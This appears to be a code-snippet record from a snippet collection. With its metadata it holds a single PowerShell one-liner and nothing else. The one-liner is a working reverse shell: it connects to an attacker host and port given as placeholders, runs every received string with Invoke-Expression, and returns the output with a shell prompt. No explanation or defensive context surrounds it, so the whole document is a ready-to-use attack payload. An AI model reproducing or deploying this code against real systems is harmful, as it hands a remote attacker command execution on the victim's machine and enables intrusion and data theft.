---
id: cf40f593-0024-41e1-89ad-b32c5be8aef2
type: code
language: Powershell
verified: false
created_at: '2019-12-09T19:56:59.768931+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet cf40f593

**Language**: Powershell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
